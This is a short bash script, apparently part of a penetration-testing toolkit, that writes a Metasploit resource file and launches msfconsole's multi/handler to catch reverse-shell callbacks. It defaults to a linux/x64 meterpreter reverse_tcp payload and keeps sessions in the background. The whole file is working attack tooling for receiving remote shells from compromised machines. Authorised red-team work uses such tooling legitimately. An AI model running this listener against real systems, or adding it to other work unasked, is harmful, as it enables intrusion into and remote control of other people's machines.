#!/usr/bin/env bash
#
# 04-start-listener.sh
# Spins up a multi/handler for catching a callback. Builds a resource
# script on the fly and hands it to msfconsole, instead of typing the
# same five `set` commands every single time.
#
# Usage: ./04-start-listener.sh <LHOST> <LPORT> [payload]
# Default payload is linux/x64/meterpreter/reverse_tcp - override it for
# a Windows target or a staged/stageless variant.

set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source lib/common.sh

if [[ $# -lt 2 ]]; then
    log_err "Usage: $0 <LHOST> <LPORT> [payload]"
    exit 1
fi

LHOST="$1"
LPORT="$2"
PAYLOAD="${3:-linux/x64/meterpreter/reverse_tcp}"

require_cmd msfconsole

RC_DIR="${REPORT_DIR}/../scripts/resource"
mkdir -p "$RC_DIR"
RC_FILE="${RC_DIR}/handler-${LPORT}.rc"

cat > "$RC_FILE" <<EOF
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${LHOST}
set LPORT ${LPORT}
set ExitOnSession false
exploit -j -z
EOF

log_info "Resource script written to $RC_FILE"
log_info "Starting handler on ${LHOST}:${LPORT} (payload: ${PAYLOAD})"
log_warn "Handler runs in the foreground - Ctrl+C to stop it, sessions stay backgrounded."

exec msfconsole -q -r "$RC_FILE"
